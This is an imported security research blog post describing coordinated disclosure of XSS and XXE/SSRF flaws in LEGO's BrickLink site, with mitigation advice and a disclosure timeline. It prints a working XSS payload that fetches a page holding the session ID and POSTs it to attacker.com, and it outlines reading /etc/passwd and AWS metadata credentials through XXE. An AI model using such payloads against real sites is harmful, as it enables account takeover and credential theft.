---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-12-15_missing-bricks-finding-security-holes-in-lego-apis.md
original_filename: 2022-12-15_missing-bricks-finding-security-holes-in-lego-apis.md
title: 'Missing Bricks: Finding Security Holes in LEGO APIs'
category: documents
detected_topics:
- sso
- ssrf
- xss
- access-control
- command-injection
- automation-abuse
tags:
- imported
- documents
- sso
- ssrf
- xss
- access-control
- command-injection
- automation-abuse
language: en
raw_sha256: 0f2ff8218108cdc406df421b8a3e17ee1249c86e1b1840f4cd9a25cd177bd781
text_sha256: 4f7a04b70cc82028e4dad94a6bf8cb17dd25291285c0f16786f29f9797fc58a8
ingested_at: '2026-06-28T07:32:16Z'
sensitivity: unknown
redactions_applied: false
---

# Missing Bricks: Finding Security Holes in LEGO APIs

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-12-15_missing-bricks-finding-security-holes-in-lego-apis.md
- Source Type: markdown
- Detected Topics: sso, ssrf, xss, access-control, command-injection, automation-abuse
- Ingested At: 2026-06-28T07:32:16Z
- Redactions Applied: False
- Raw SHA256: `0f2ff8218108cdc406df421b8a3e17ee1249c86e1b1840f4cd9a25cd177bd781`
- Text SHA256: `4f7a04b70cc82028e4dad94a6bf8cb17dd25291285c0f16786f29f9797fc58a8`


## Content

---
title: "Missing Bricks: Finding Security Holes in LEGO APIs"
page_title: "Finding Security Holes in LEGO APIs - API Vulnerabilities"
url: "https://salt.security/blog/missing-bricks-finding-security-holes-in-lego-apis"
final_url: "https://salt.security/blog/missing-bricks-finding-security-holes-in-lego-apis"
authors: ["Shiran Yodev"]
programs: ["LEGO"]
bugs: ["XSS", "XXE"]
publication_date: "2022-12-15"
added_date: "2022-12-15"
source: "pentester.land/writeups.json"
original_index: 1773
---

Salt Labs

# Missing Bricks: Finding Security Holes in LEGO APIs

December 15, 2022

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6604813b851912ddf286bb67_SYodev.jpg)[Shiran Yodev](/blog-authors/shiran-yodev)

Security Researcher

Modern business sectors with rapid growth are often a very fertile ground for finding security issues. Companies that are growing very quickly often release software rapidly and sometimes prioritize business functionality over security. The quicker a business grows, the more chances to find security issues in its environment. Since APIs are at the heart of most modern services, they’re subject to the same challenges.

Almost every business sector is adopting API usage today — finding an online service with no APIs in use is nearly impossible today. To showcase this prevalence, we decided to take a look at a popular, yet untraditional service. We wanted to choose a service that is being used by millions of people, yet is not fundamentally a technology business.

[We chose to investigate](https://salt.security/press-releases/salt-security-uncovers-api-security-flaws-within-the-lego-group-online-service-platform) the services provided by LEGO, perhaps the most famous toy manufacturer in the world, because we contend this example sheds light on the reality of quick adoption of APIs and the risks that can come with that fast pace.

Our findings show that LEGO’s online services could have allowed an attacker to:

  * Manipulate service users to gain complete control over their accounts.
  * Leak PII and other sensitive data stored internally by the service.
  * Gain access to internal production data, which could lead to full compromise of the company’s internal servers.

We disclosed all the issues we found with the security team at the LEGO Group, and at the moment, our tests show the issues are resolved. The LEGO security team has an internal policy that prevents them from sharing any information regarding reported vulnerabilities. As a result, we are unable to positively confirm these fixes. We encourage any concerned LEGO fan to reach out to LEGO and request a direct update from them. That same LEGO policy also means we could not confirm or deny whether any of these attack vectors were exploited. 

To make it clear — these API issues are not unique to LEGO, and in fact LEGO has acted very professionally following our report of the issues. This case does, however, teach us that every online server — big or small, simple or complicated – may be exposed to similar issues. Our hope is that this post will raise awareness among both service providers and consumers of the existence of such issues so we as an industry can collectively move toward a better and more secure API ecosystem.

Happy reading.

## Why LEGO?

The LEGO Group is the world’s largest toy company, earning annual revenues in the billions of dollars. Nearly everyone in the world knows the brand LEGO. Personally, as an [AFOL](https://en.wiktionary.org/wiki/AFOL), I enjoy collecting and building LEGO sets in my spare time, and as a professional hacker, I also happen to enjoy hacking systems for a living. I know conventional wisdom is to not mix business with pleasure, but what’s the worst that can happen? YOLO!

## Research Strategy

My initial approach to the target was to investigate the main domain of lego.com. I looked at the website from a user’s perspective and saw that while LEGO is a big company, the website doesn’t have much functionality, and the attack surface is quite small. LEGO does have an online store and probably many users in its database, but the main website has little complexity and logic, so the chance for finding vulnerabilities is quite small.

However, the main LEGO site is not the only online service provided by LEGO. Another website owned by LEGO came to my mind — bricklink.com. BrickLink was initially founded in 2000 by a LEGO fan who wanted to build a trading platform for LEGO bricks and sets.

With time, the platform grew until it effectively became the biggest and best marketplace for second-hand LEGO in the world, and it is one of the very few places you can find rare and retired LEGO sets. In fact, BrickLink became so big it was acquired by LEGO itself in late 2019 and officially became part of The LEGO Group.

As a LEGO fan, I used bricklink.com many times, and I knew the service it provides is fairly complex compared to the LEGO main site. It enables sellers to manage stores, helps buyers buy and manage their collection lists of parts and sets, offers a studio platform for designers to design their LEGO creations, and more.

Usually, this much logic means the potential for a large attack surface, so why not test how solid these bricks are? (Spoiler: not so solid)

## Connecting Two Bricks to Achieve Account Takeover

One of the areas I started with in my research was looking for the various places in which the website receives user input and checking how exactly it is being handled and what can possibly be done with it.

My first finding was a “search for coupons” functionality:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6398d10f7b038439bf4c9442_DCA72D8C-87ED-49F8-A9C0-1E7C32D73425_1_201_a.jpeg)

In the “Find Username” dialog box, a user can write a free text that eventually ends up rendered into the webpage’s HTML:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6398d15609be431ac2485b62_7B38C4EC-29B2-48E6-897D-A6534C2C3FF9_4_5005_c.jpeg)

Users can abuse this open field to input text that can lead to a cross-site scripting (XSS) condition. To prevent such abuse, the web server should sanitize the input and properly escape any HTML characters to avoid this kind of injection. 

Let’s see what happens when we try to insert HTML characters:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6398d1b5accb1314b4c02a19_4D91955A-BF71-445C-BFBC-208B9DB17D97_1_201_a.jpeg)

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6398d1d311e90314df23f9b8_4DF97053-B9DB-41A1-98E8-49A2782DA8B9_4_5005_c.jpeg)

As we can see, the input isn’t sanitized correctly, leading to code injection in the rendered web page. From this point, the path to a functional XSS is very short. 

With the input **"onfocus="alert('XSS')"autofocus="** an alert popped, proving that the JavaScript code was indeed injected and executed on the page.

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6398d21e733e4a88636b2c54_xss5.png)

Finding this XSS, however, is just the “base brick.” To leverage this vulnerability further, we needed to layer another vulnerability on top of it. 

A classic example of leveraging an XSS would be to read **document.cookie** – which holds the user's “secret” session ID – and send it to a malicious server. If an attacker gains this cookie, he may be able to use it to steal data or completely take over a victim's account by logging into the account on her behalf.

From my interaction with the website, I learned that the cookie value named **‘BLNEWSESSIONID’** is the one used by the server to identify the client account. Therefore, if I could steal it from a victim, I could prove that account takeover is indeed possible.

However, in our case, it wasn’t possible to directly read that value from **document.cookie** since it was defined as **HttpOnly**. HttpOnly is a protection that prevents the JS code from being able to read that cookie value, which is exactly what I want to achieve. So I needed to find another way to get that cookie value…

From experience, I found that it is very important to document the entire research process from start to finish. In this case, this methodology proved to be very handy as I used Burp Suite to search the history of all my previous interactions with the website to quickly find that in the endpoint **www.bricklink.com/v3/member/community_experts.page** the session ID value was actually embedded in the page’s code:

‍

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6398daf00b12457ce950a9d8_Screen%20Shot%202022-12-13%20at%2022.04.40.png)

Then I crafted a payload that will read the page’s code and send it to my server:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6398da7659ebabe25f897c94_Screen%20Shot%202022-12-13%20at%2022.02.37.png)

Chaining the XSS vulnerability with the exposed and unprotected session ID allowed me to successfully accomplish a full account takeover, given that a logged-in user clicks a link similar to this:

**https://bricklink.com/orderCoupons.asp?v=W &viewUsername=xss"onfocus="fetch('https://www.bricklink.com/v3/member/community_experts.page').then(response=>response.text()).then(data=>fetch('https://attacker.com',{method:'POST',mode: 'no-cors',body:data}));"+autofocus="**

As with any XSS, the outcome of this vulnerability may be severe. However, it does require some user interaction to achieve exploitation, which is by nature limiting the attack.

So I continued to inspect the site to see if I could find any more issues that do not require user interaction to exploit.

## Most-Wanted List (of files on the server)

Another interesting functionality that receives direct user input is the **“Upload to Wanted List”** page. This endpoint allows a user to upload a list of wanted parts and sets in XML format. Let's see how it works:

The user inputs the wanted set in the correct format (XML):

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6398d7cbe2c2a55d63e7bb05_xxe1.png)

And after clicking **“Proceed”** the list is created:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6398d9463c80690e9c46f577_xxe2.png)

So far so good. However, the usage of XML format brings a unique smell to it … the smell of XXE (XML External Entities).

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/63925695c146e0017c5e5822_10.png)

The [XML 1.0 standard](https://www.w3.org/TR/REC-xml/) defines the structure of an XML document. The standard defines a concept called an entity, which is a storage unit of some type. [External entity](https://www.w3.org/TR/REC-xml/#sec-external-ent) is one of the XML entity types, which allows access to local or remote content via a declared system identifier. 

The system identifier is assumed to be a URI that can be accessed by the XML processor when processing the entity. The XML processor then replaces occurrences of the named external entity with the contents dereferenced by the system identifier. As a result, the XML processor may disclose confidential information which is not typically accessible by the application.

To test for a vulnerable condition, I added an XML External Entity that refers to**/etc/passwd/** and entered its content in the **Item ID** field.

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6398db3e84b4c5430eb9196a_Screen%20Shot%202022-12-13%20at%2022.06.00.png)

I clicked “**Proceed** ” and got the following error back from the server:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6398dbecf62514e66848019e_Screen%20Shot%202022-12-13%20at%2022.08.53.png)

Boom! We can see some of the content of **/etc/passwd** in the error message.

This small experiment works, and I successfully accomplished an XXE injection attack that allows a system file read with the permissions of the running user. However, even though I was able to read a file from the server, the content was processed by the XML processor in the server, and eventually, only a small portion of the content was sent back with the error message. I needed to find a way to get more.

I referred to the manual to learn more about the XML format that BrickLink defines for the list and noticed the following:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6398d9c2933c855eed725e79_175E7B2B-26EF-41A3-8583-64774C53DF3D_4_5005_c.jpeg)

The **Remarks** field can contain **any text** , which is exactly what I need.

Well, it can’t directly contain HTML tags, but I don’t actually need that since I already injected HTML previously – at this phase, I am looking for other attack vectors. However, the documentation doesn’t say anything about not containing the contents of **/etc/passwd** , right?

So I issue the following request:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6398dc6b37ba8c70a3286df8_Screen%20Shot%202022-12-13%20at%2022.10.49.png)

And I get back the entire content of the ‘/etc/passwd’ file:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6398dcae4b142626ac0bcb3c_Screen%20Shot%202022-12-13%20at%2022.12.11.png)

Now I have a fully functional arbitrary file read on the server.

Another attack vector that XXE injection attack usually enables is Server Side Request Forgery (SSRF). Since an external entity can also be a URL, the server may issue HTTP requests to any URL we wish during the XML parsing process.

SSRF can be abused in many ways. One example is for a target running on AWS EC2. In that system, an SSRF could cause the server to issue a request to the unique IP 169.254.169.254, which AWS uses by default to retrieve an instance metadata. As this IP can be accessed only locally from the instance and is not exposed externally, an SSRF can bypass this limitation by issuing the call to that service by the server itself, allowing retrieval of the target’s credentials.

I identified that the BrickLink web server is running on AWS EC2, so I issued the following request:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6398dce54d4d4679c1fdcc0e_Screen%20Shot%202022-12-13%20at%2022.13.05.png)

And I got back the following response, which contained the AWS EC2 credentials of the server. I could have used those credentials to authenticate as that role:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6398dd163b8c77723a6d07c1_Screen%20Shot%202022-12-13%20at%2022.13.52.png)

## How to Avoid a Similar Vulnerability in Your Systems

Often with API vulnerabilities, the most damage arises in combining or cascading attacks. The LEGO case is no different. Follow these recommendations to avoid similar vulnerabilities in your organization.

  1. XSS is sometimes unjustly underestimated, because it is not a direct threat on the server. However, as users are compromised, the effect and damage can escalate quickly. The most important rule of thumb with XSS is to never trust user input. Input should be properly sanitized and escaped. For more information and specific ways to prevent XSS vulnerabilities, refer to the [XSS Prevention Cheat Sheet by OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).
  2. Session ID is a common target for attackers, because it can often be used for session hijacking and account takeover. It is important to be very careful when handling it and not expose or misuse it for other purposes.
  3. The easiest and most effective way to stop XXE injection attacks is to completely disable External Entities in your XML parser’s configuration. For more details on preventing these exposures, refer to the [XXE Prevention Cheat Sheet by OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html).

To learn more about how Salt can help defend your organization from API risks, you can [connect with a rep](https://salt.security/contact-us) or[ schedule a personalized demo](https://content.salt.security/demo.html).

## Disclosure Timeline

Here is the timeline we followed throughout this coordinated disclosure process. Again, we thank and salute LEGO for taking action so quickly to resolve these critical vulnerabilities.

  * Salt Labs discovers security vulnerabilities: October 18, 2022
  * Salt Labs discloses technical details to LEGO security team: October 23, 2022
  * LEGO security team confirms disclosure: October 25, 2022
  * Salt Labs confirms exploits are no longer working and security gaps have been resolved: November 10, 2022
  * Salt Labs sends email to LEGO security team to confirm it has addressed and resolved the security issues: November 13, 2022
  * LEGO security team responds that internal policy is to not comment on such issues: November 21, 2022
  * Salt Labs responds, confirming plans for publication of the issue and resolution, following coordinated disclosure process: November 21, 2022
  * Salt Security marketing team sends LEGO media team notice of upcoming publication, to avoid surprising the broader LEGO team: December 6, 2022
  * Salt Security marketing team sends one final note to LEGO media team to confirm timing of this publication: December 13, 2022

## 

## Tags

[Salt Labs](/blog-tags/salt-labs)

[API Vulnerability Analysis](/blog-tags/api-vulnerability-analysis)

[Research](/blog-tags/research)

## Categories

[Customer](/blog-categories/customer)

[Product](/blog-categories/product)

[Industry](/blog-categories/industry)

[Technical](/blog-categories/technical)

[Company](/blog-categories/company)

[Salt Labs](/blog-categories/salt-labs)

## Salt Security Blog

Sign up for the Salt Newsletter for the latest resources and blog posts.

## Our latest posts

[IndustryWe Trained Cybersecurity Startups to Win POVs, Not Solve ProblemsRoey Eliyahu | June 22, 2026If agents are connected to APIs, attackers can use them to explore and exploit weak authorization paths faster. The API vulnerability was already serious. Agentic access makes it scalable.Read more](/blog/we-trained-cybersecurity-startups-to-win-povs-not-solve-problems)

[IndustryDeconstructing the Agentic Stack: Why API Visibility Is the Ultimate Defense for AI AgentsRoy Bar Yosef | June 11, 2026Organizations are rushing to deploy AI agents, but many still lack a clear view of what those agents can access, which tools they can call, and which APIs they can trigger.Read more](/blog/deconstructing-the-agentic-stack-why-api-visibility-is-the-ultimate-defense-for-ai-agents)

[IndustryEveryone Is Buying AI Guardrails. But Agents Have the Keys to the Car.Roey Eliyahu | June 8, 2026The first wave of AI security was necessary. It gave us guardrails for prompts, models, and outputs. But agents changed the security question.Read more](/blog/everyone-is-buying-ai-guardrails-but-agents-have-the-keys-to-the-car)
